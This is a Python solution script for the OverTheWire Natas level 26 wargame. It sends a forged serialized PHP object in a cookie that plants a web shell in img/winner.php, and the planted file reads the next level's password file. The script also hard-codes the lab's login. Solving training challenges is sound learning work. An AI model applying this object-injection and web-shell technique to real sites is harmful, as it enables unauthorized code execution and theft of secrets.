import requests
import re
from string import *
import time
import sys
import codecs
import base64
import urllib

characters = "abcdefghijkjmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ0123456789"

#Parte do código é pego para constriur o objeto serialized no lugar do arquivo de log colocamos nosso php, e o texto  dentro desse php colocamos nosso codigo em php , serlializamos ele depois passamos para base64
for a in range(1):
    cookie={"drawing":"Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3dpbm5lci5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30="}

    logar = ["natas26","oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"]
    url = "http://%s.natas.labs.overthewire.org/"%logar[0]
    session = requests.Session()



    r=session.get(url+"?x1=2&y1=22&x2=33&y2=444",cookies=cookie,auth=(logar[0],logar[1]))
    contento = r.text
    print(contento)
    #print(unquote_u(base64.b64decode(session.cookies["drawing"])))
    print("="*80)

    r=session.get(url+"img/winner.php",cookies=cookie,auth=(logar[0],logar[1]))
    print(r.text)
    print(session.cookies)
